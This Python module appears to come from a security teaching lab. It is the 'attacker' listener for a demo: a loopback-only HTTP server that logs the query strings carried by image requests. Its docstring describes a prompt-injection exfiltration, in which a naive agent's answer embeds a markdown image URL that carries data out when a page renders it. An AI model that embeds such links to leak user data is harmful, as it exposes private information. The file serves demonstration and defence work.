"""The "attacker" end of scenario N-I3: a local HTTP server that logs what an image URL carried.

Run ``python -m sqlguard.lab.attacker_listener`` in a terminal next to the browser. When the naive
agent's answer embeds ``![s](http://127.0.0.1:9999/s.gif?d=...)`` and the compare page renders it,
the browser fetches the image and this terminal prints the decoded query string: that is the data
leaving the system.

The bind address is fixed to loopback on purpose (no host argument): the demo must never accept
connections from another machine or send anything off the presenter's laptop.
"""

from __future__ import annotations

import base64
import sys
from datetime import datetime
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import TextIO
from urllib.parse import parse_qsl, urlsplit

HOST = "127.0.0.1"
PORT = 9999
# Smallest transparent GIF; the browser gets a real image so nothing on the page looks broken.
PIXEL = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")


def format_hit(path: str, *, now: datetime | None = None) -> str:
    """One log line per request: time, path and every decoded query parameter."""
    parts = urlsplit(path)
    stamp = (now or datetime.now()).strftime("%H:%M:%S")
    params = parse_qsl(parts.query, keep_blank_values=True)
    lines = [f"[{stamp}] GET {parts.path}"]
    lines += [f"    {name} = {value}" for name, value in params]
    return "\n".join(lines)


class ListenerHandler(BaseHTTPRequestHandler):
    output: TextIO = sys.stdout

    def do_GET(self) -> None:  # noqa: N802 - name fixed by BaseHTTPRequestHandler
        print(format_hit(self.path), file=self.output, flush=True)
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.send_header("Content-Length", str(len(PIXEL)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(PIXEL)

    def log_message(self, format: str, *args: object) -> None:  # noqa: A002
        """Silence the default access log; ``do_GET`` prints the decoded version instead."""


def create_server(port: int = PORT) -> ThreadingHTTPServer:
    """Always bound to 127.0.0.1. ``port`` exists for tests (0 picks a free port)."""
    return ThreadingHTTPServer((HOST, port), ListenerHandler)


def main() -> None:  # pragma: no cover - manual demo tool
    server = create_server()
    print(f"Attacker listener trên http://{HOST}:{PORT}/ (Ctrl+C để dừng)", flush=True)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


if __name__ == "__main__":  # pragma: no cover
    main()
